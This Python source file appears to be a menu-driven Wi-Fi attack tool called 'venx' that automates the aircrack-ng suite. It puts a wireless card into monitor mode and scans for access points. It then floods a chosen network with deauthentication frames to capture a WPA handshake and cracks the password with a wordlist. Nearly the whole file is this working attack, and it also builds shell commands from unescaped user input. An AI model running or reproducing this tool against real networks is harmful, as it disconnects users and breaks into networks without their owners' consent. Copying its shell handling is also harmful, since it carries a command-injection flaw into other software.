import os,sys,subprocess,time,random
import src.constants as cs
from src.intro import intro,intro2,intro3
from src.intro import intro4,intro5,intro6
from src.intro import intro7,intro8,intro9
from src.intro import intro10

if os.geteuid() != 0:
    print("\033[0;31m")
    print("Run this as root")
    exit(1)
subprocess.run("clear")
class venx:
    def __init__(self):
        self.bssid = ''
        self.channel = ''
        self.essid= ''
        self.card = ''
        self.data=[]
        self.hs_dir ='hs/'
        self.path_to_hs=''
        self.path_to_wordlist='psw/pass.txt'
        self.temporary_file_dir='temporary/'
        self.wifi_list=[]
        self.screen = self.intro_screen()
    
    def intro_screen(self):
        num = random.randint(0,9)
        if num == 0:
            intro().intro()
        elif num == 1:
            intro2().intro()
        elif num == 2:
            intro3().intro()
        elif num == 3:
            intro4().intro()
        elif num == 4:
            intro5().intro()
        elif num == 5:
            intro6().intro()
        elif num == 6:
            intro7().intro()
        elif num == 7:
            intro8().intro()
        elif num == 8:
            intro9().intro()
        elif num == 9:
            intro10().intro()
    def clear_screen(self):
        subprocess.run("clear")
    def file_exist(self,file):
        if os.path.exists(file):
            return True
        else:
            return False

    # Handling card's modes
    def put_card_into_monitor(self):
        try:
            if self.card["mode"] != "Monitor":
                subprocess.run(["ifconfig", self.card['name'], 'down'], check=True)
                subprocess.run(["iwconfig", self.card['name'], 'mode','monitor'], check=True)
                subprocess.run(["ifconfig", self.card['name'], 'up'], check=True)
                card_name=self.card["name"]
                self.card["mode"]="Monitor"
                print(f"{cs.bold_green}Successfully put {card_name} into monitor mode.{cs.no_color}")
                time.sleep(1)
                self.clear_screen()
                self.screen=self.show_main_menu()
            else:
                card_name=self.card["name"]
                print(f"{cs.bold_pink}{card_name}{cs.bold_green} is already in monitor mode{cs.no_color}")
        except subprocess.CalledProcessError as e:
            print(f"{cs.bold_red}Error putting {card_name} into monitor mode: {e}{cs.no_color}")
    def put_card_into_managed(self):
        try:
            if self.card["mode"] != "Managed":
                subprocess.run(["ifconfig", self.card['name'], 'down'], check=True)
                subprocess.run(["iwconfig", self.card['name'], 'mode','managed'], check=True)
                subprocess.run(["ifconfig", self.card['name'], 'up'], check=True)
                card_name=self.card["name"]
                self.card["mode"]="Managed"
                print(f"{cs.bold_green}Successfully put {card_name} into managed mode.{cs.no_color}")
                time.sleep(1)
                self.clear_screen()
                self.screen=self.show_main_menu()
            else:
                card_name=self.card["name"]
                print(f"{cs.bold_pink}{card_name}{cs.bold_green} is already in managed mode{cs.no_color}")
        except subprocess.CalledProcessError as e:
            print(f"{cs.bold_red}Error putting {card_name} into managed mode: {e}{cs.no_color}")
    def put_card_into_managed_when_exiting(self):
        try:
            if self.card["mode"] != "Managed":
                subprocess.run(["ifconfig", self.card['name'], 'down'], check=True)
                subprocess.run(["iwconfig", self.card['name'], 'mode','managed'], check=True)
                subprocess.run(["ifconfig", self.card['name'], 'up'], check=True)
                card_name=self.card["name"]
                self.card["mode"]="Managed"
                print(f"{cs.bold_green}Successfully put {card_name} into managed mode.{cs.no_color}")
                time.sleep(1)
            else:
                card_name=self.card["name"]
                print(f"{cs.bold_pink}{card_name}{cs.bold_green} is already in managed mode{cs.no_color}")
        except subprocess.CalledProcessError as e:
            print(f"{cs.bold_red}Error putting {card_name} into managed mode: {e}{cs.no_color}")

    # Geting input,wireless cards and exiting script 
            
    def get_input(self):
        input_get=input(f"{cs.bold_pink}venx-->{cs.no_color}")
        return input_get
    def exit_script(self):
        exit=input(f"{cs.warning_yellow}Do you really wanna exit(y/n)? ")
        if exit == 'y' or exit == 'Y':
            if self.card["mode"] == "Monitor":
                choise =input(f"{cs.warning_yellow}Your card is in 'Monitor mode, do you want to keep it(y/n)?")
                if choise == 'y' or choise == 'Y':
                    print(f"{cs.bold_red}Exiting the script....")
                    time.sleep(1)
                    print(f"{cs.bold_green}Have a nice time, see you later.")
                    sys.exit()
                elif choise == 'n' or choise == 'N':
                    self.put_card_into_managed_when_exiting()
                    print(f"{cs.bold_red}Exiting the script....")
                    time.sleep(1)
                    print(f"{cs.bold_green}Have a nice time, see you later.")
                    sys.exit()
                else:
                    print(f"{cs.bold_red}Wrong Input!")
                    self.exit_script()
            else:
                print(f"{cs.bold_red}Exiting the script....")
                time.sleep(1)
                print(f"{cs.bold_green}Have a nice time, see you later.")
                sys.exit()

        else:
            print(f"{cs.bold_blue}Continuing the session")
            time.sleep(0.5)
            self.clear_screen()
            self.screen = self.show_main_menu()


    def get_wireless_cards(self):
        iwconfig_output = os.popen("iwconfig 2>/dev/null").read()
        iwconfig_lines = iwconfig_output.splitlines()
        for i in iwconfig_lines:
            if "Mode:Managed" in i.split():
                index = iwconfig_lines.index(i) - 1
                words=iwconfig_lines[index].split()
                device=words[0]
                card_info ={
                        "name": device,
                        "mode":"Managed"
                    }
                self.data.append(card_info)
            if "Mode:Monitor" in i.split():
                device=i.split()[0]
                card_info = {
                    "name": device,
                    "mode": "Monitor"
                }
                self.data.append(card_info)
    def choose_wireless_cards(self):
        print(f"{cs.bold_pink}Choose a wireless card.")

        for i in self.data:
            device_index=self.data.index(i)
            device_name=i["name"]
            print(f"{cs.bold_blue}{device_index + 1}. {device_name}")   
        print("\n")
        card_is_set=False
        while card_is_set ==False:
            choise=self.get_input()
            try:
                choise=int(choise)
                if choise >= 1 and choise <= len(self.data):
                    self.card = self.data[choise -1]  
                    card_is_set=True
                    self.clear_screen()
                    self.show_main_menu()
                else:
                    print(f"{cs.bold_red}Wrong Input!")
            except ValueError:
                print(f"{cs.warning_yellow}Input must be an integer!")

    #Attacks here
    def deauth_and_hs_capture_attack(self):
        hs_name=input(f"{cs.bold_blue}give a name to handshake: ")
        self.path_to_hs=self.hs_dir+hs_name+'-01.cap'
        card_name=self.card["name"]
        bssid=self.bssid
        channel=self.channel
        path_to_hs=f"{self.hs_dir}{hs_name}"
        command = f"xterm -geometry '100x25+900+0' -e bash -c 'airodump-ng --bssid {bssid} --channel {channel} --output-format cap -w {path_to_hs} {card_name}'"
        subprocess.run(["iwconfig","wlan0", "channel",channel])
        command2 = f"xterm -geometry '100x25+200+0' -hold -e bash -c 'aireplay-ng --deauth 20 -a {bssid}  {card_name}'"
        subprocess.Popen(command, shell=True)
        subprocess.Popen(command2, shell=True)
        self.clear_screen()
        self.show_wpa_attacks_menu()
 

    def get_handshake(self):
        if self.card["mode"] != "Monitor":
            print(f"{cs.bold_red} Monitor mode needed for this")
            print(f"{cs.bold_blue}Put your card into 'Monitor' mode in main menu")
            time.sleep(3)
            self.clear_screen()
            self.screen=self.show_wpa_attacks_menu()
        else:
            card_name=self.card["name"]
            try:
                # Run airodump-ng in a separate xterm terminal and redirect output to a file
                print(f"{cs.bold_pink}Close the window when you see the target wifi.")
                command = f"xterm -geometry '100x30+600+0' -e bash -c 'airodump-ng --output-format csv -w temporary/output_file {card_name}'"
                subprocess.run(command, shell=True)

                # Wait for a moment to ensure the process is running and producing output
                time.sleep(1)
                self.clear_screen()
                self.show_navbar()
                # Read the contents of the output file
                with open('temporary/output_file-01.csv', 'r') as file:
                    output_lines = file.readlines()
                # Print each line
                index=0
                for line in output_lines:
                    if "Station MAC" in line.split(','):
                        final_line_index=output_lines.index(line)
                self.wifi_list=[]
                for line in output_lines:
                    if line.strip() == '':
                        continue
                    if "BSSID" in line.split(','):
                        continue
                    if output_lines.index(line)<final_line_index-1:
                        words=line.split(',')
                        bssid=words[0]
                        essid=words[13]
                        channel=words[3]
                        data={
                            "essid": essid,
                            "bssid": bssid,
                            "channel": channel
                        }
                        self.wifi_list.append(data)
                        index+=1
                subprocess.run(["rm","temporary/output_file-01.csv"])
                for wifi in self.wifi_list:
                    essid=wifi["essid"]
                    bssid=wifi["bssid"]
                    channel=wifi["channel"]
                    index=self.wifi_list.index(wifi)
                    print(f"{cs.bold_blue}{index}. {essid}   BSSID: {bssid}  CHANNEL: {channel} ")
                print(f"{cs.bold_green}Enter number of the wifi.")
                print('\n')
                choise = int(self.get_input())
                wifi_is_set=False
                while wifi_is_set ==False:
                    if choise > len(self.wifi_list):
                        wifi_is_set = False
                    elif 0 <= choise <= len(self.wifi_list):
                        self.bssid=self.wifi_list[choise]["bssid"]
                        self.channel=self.wifi_list[choise]["channel"]
                        self.essid=self.wifi_list[choise]["essid"]
                        self.clear_screen()
                        self.deauth_and_hs_capture_attack()
                        self.show_wpa_attacks_menu()
                        wifi_is_set=True
                    else:
                        wifi_is_set=False

            except Exception as e:
                print(f"Error: {str(e)}")

    def crack_hs_password(self):
        if self.path_to_hs != '':
            print(f"{cs.warning_yellow}Type 0(zero) to continue with already captured or set hadshake file.")
            choise=input(f"{cs.bold_blue}Give path to Handshake: ")
            if choise == '0':
                print(f"{cs.bold_green}Using previous handshake.")
            else:
                if self.file_exist(choise):
                    self.path_to_hs=choise
                    print(f"{cs.bold_pink}path to handshake is set!")
                else:
                    print(f"{cs.bold_red}File does not exist!")
                    self.crack_hs_password()

        else:
            choise=input(f"{cs.bold_blue}Give path to Handshake: ")
            if self.file_exist(choise):
                self.path_to_hs=choise
                print(f"{cs.bold_pink}path to handshake is set!")
            else:
                print(f"{cs.bold_red}File does not exist!")
                self.crack_hs_password()

        print(f"{cs.warning_yellow}Type 0(zero) to use default wordlist.")
        wordlist_is_set=False
        while wordlist_is_set == False:
            wordlist=input(f"{cs.bold_blue}Enter path to wordlist: ")
            if wordlist == '0':
                print(f"{cs.bold_pink}Using default wordlist.")
                wordlist_is_set=True
            else:
                if self.file_exist(wordlist):
                    self.path_to_wordlist=wordlist
                    print(f"{cs.bold_green}Wordlist is set!")
                    wordlist_is_set=True

                else:
                    wordlist_is_set =False
        time.sleep(1)
        print(f"{cs.brown}Dictionary attack is initializing.....")
        time.sleep(1)
        command=f"xterm -geometry '100x50+600+0' -hold -e bash -c 'aircrack-ng {self.path_to_hs} -w {self.path_to_wordlist}'"
        subprocess.run(command,shell=True)
        print(f"{cs.warning_yellow}Process ended!")
        time.sleep(1)
        self.clear_screen()
        self.show_wpa_attacks_menu()
    
    def get_hs_and_crack(self):
        if self.card["mode"] != "Monitor":
            print(f"{cs.bold_red} Monitor mode needed for this")
            print(f"{cs.bold_blue}Put your card into 'Monitor' mode in main menu")
            time.sleep(3)
            self.clear_screen()
            self.screen=self.show_wpa_attacks_menu()
        else:
            card_name=self.card["name"]
            try:
                # Run airodump-ng in a separate xterm terminal and redirect output to a file
                print(f"{cs.bold_pink}Close the window when you see the target wifi.")
                command = f"xterm -geometry '100x30+600+0' -e bash -c 'airodump-ng --output-format csv -w temporary/output_file {card_name}'"
                subprocess.run(command, shell=True)

                # Wait for a moment to ensure the process is running and producing output
                time.sleep(1)
                self.clear_screen()
                self.show_navbar()
                # Read the contents of the output file
                with open('temporary/output_file-01.csv', 'r') as file:
                    output_lines = file.readlines()
                # Print each line
                index=0
                for line in output_lines:
                    if "Station MAC" in line.split(','):
                        final_line_index=output_lines.index(line)
                self.wifi_list=[]
                for line in output_lines:
                    if line.strip() == '':
                        continue
                    if "BSSID" in line.split(','):
                        continue
                    if output_lines.index(line)<final_line_index-1:
                        words=line.split(',')
                        bssid=words[0]
                        essid=words[13]
                        channel=words[3]
                        data={
                            "essid": essid,
                            "bssid": bssid,
                            "channel": channel
                        }
                        self.wifi_list.append(data)
                        index+=1
                subprocess.run(["rm","temporary/output_file-01.csv"])
                for wifi in self.wifi_list:
                    essid=wifi["essid"]
                    bssid=wifi["bssid"]
                    channel=wifi["channel"]
                    index=self.wifi_list.index(wifi)
                    print(f"{cs.bold_blue}{index}. {essid}   BSSID: {bssid}  CHANNEL: {channel} ")
                print(f"{cs.bold_green}Enter the number of the wifi.")
                print('\n')
                choise = int(self.get_input())
                wifi_is_set=False
                while wifi_is_set ==False:
                    if choise > len(self.wifi_list):
                        wifi_is_set = False
                    elif 0 <= choise <= len(self.wifi_list):
                        self.bssid=self.wifi_list[choise]["bssid"]
                        self.channel=self.wifi_list[choise]["channel"]
                        self.essid=self.wifi_list[choise]["essid"]
                        self.clear_screen()
                        self.deauth_and_hs_capture_attack_2()
                        wifi_is_set=True
                    else:
                        wifi_is_set=False

            except Exception as e:
                print(f"Error: {str(e)}")
            wordlist_is_set=False
            while wordlist_is_set == False:
                print(f"{cs.warning_yellow}Type 0(zero) for default.")
                wordlist=input(f"{cs.bold_blue}Enter path to wordlist: ")
                if wordlist == '0':
                    print(f"{cs.bold_pink}Using default wordlist.")
                    wordlist_is_set=True
                else:
                    if self.file_exist(wordlist):
                        self.path_to_wordlist=wordlist
                        print(f"{cs.bold_green}Wordlist is set!")
                        wordlist_is_set=True

                    else:
                        wordlist_is_set =False
            time.sleep(1)
            print(f"{cs.bold_brown}Dictionary attack is initializing.....")
            time.sleep(1)
            command=f"xterm -geometry '100x50+600+0' -hold -e bash -c 'aircrack-ng {self.path_to_hs} -w {self.path_to_wordlist}'"
            subprocess.run(command,shell=True)
            print(f"{cs.warning_yellow}Process ended!")
            time.sleep(1)
            self.clear_screen()
            self.show_wpa_attacks_menu()

    def deauth_and_hs_capture_attack_2(self):
        hs_name=input(f"{cs.bold_blue}give a name to handshake: ")
        self.path_to_hs=self.hs_dir+hs_name+'-01.cap'
        card_name=self.card["name"]
        bssid=self.bssid
        channel=self.channel
        path_to_hs=f"{self.hs_dir}{hs_name}"
        command = f"xterm -geometry '100x25+900+0' -e bash -c 'airodump-ng --bssid {bssid} --channel {channel} --output-format cap -w {path_to_hs} {card_name}'"
        subprocess.run(["iwconfig","wlan0", "channel",channel])
        command2 = f"xterm -geometry '100x25+200+0' -hold -e bash -c 'aireplay-ng --deauth 20 -a {bssid}  {card_name}'"
        subprocess.Popen(command, shell=True)
        subprocess.Popen(command2, shell=True)
        
        
        
    
    # Attack menues here
    def show_wpa_attacks_menu(self):
        self.show_navbar()
        options=["Back to main menu","Exit script","Get handshake","Crack existing handshake","Get handshake and crack"]
        for i in options:
            print(f"{cs.bold_blue}{options.index(i)}. {i}")
        print("\n")
        option_is_set=False
        while option_is_set ==False:
            choise=int(self.get_input())
            if choise >= 0 and choise <= len(options)-1:
                if choise == 0:
                    self.clear_screen()
                    self.show_main_menu()
                if choise == 1:
                    self.exit_script()
                if choise == 2:
                    self.get_handshake()
                if choise == 3:
                    self.crack_hs_password()
                if choise == 4:
                    self.get_hs_and_crack()

    # Main menues and main function here
    def show_main_menu(self):
        self.show_navbar()
        options=["Exit script","Put card into monitor mode","Put card into managed mode",
                 "Select another card","WPA/WPA2 attacks menu"]
        for i in options:
            print(f"{cs.bold_blue}{options.index(i)}. {i}")
        print("\n")
        option_is_set=False
        while option_is_set ==False:
            choise=int(self.get_input())
            if choise >= 0 and choise <= len(options)-1:
                if choise == 0:
                    self.exit_script()
                elif choise == 1:
                    self.put_card_into_monitor()
                elif choise == 2:
                    self.put_card_into_managed()
                elif choise == 3:
                    self.choose_wireless_cards()
                elif choise == 4:
                    self.clear_screen()
                    self.show_wpa_attacks_menu()
                    
            else:
                print(f"{cs.bold_red}Wrong Input!")
                self.clear_screen()
                self.show_main_menu()
                

    def show_navbar(self):
        card_name=self.card["name"]
        card_mode=self.card["mode"]
        print("\n")
        if self.card["mode"] == "Monitor":
            mode_color=cs.bold_red
        else:
            mode_color=cs.bold_green
        print(f"{cs.bold_white}Card:{cs.bold_green}{card_name}{cs.bold_white}  Mode:{mode_color}{card_mode}{cs.bold_white}\
    Bssid:{cs.bold_green}{self.bssid} {cs.bold_white}  Channel:{cs.bold_green}{self.channel}{cs.bold_white}\
    Essid:{cs.bold_green}{self.essid} {cs.bold_white} \nHandshake:{cs.bold_green}{self.path_to_hs} {cs.bold_white}\
    Wordlist:{cs.bold_green}{self.path_to_wordlist}")
        print("\n")
    

    def main(self):
        self.get_wireless_cards()
        self.choose_wireless_cards()
        self.screen = self.show_main_menu()

if __name__=="__main__":
    venx().main()


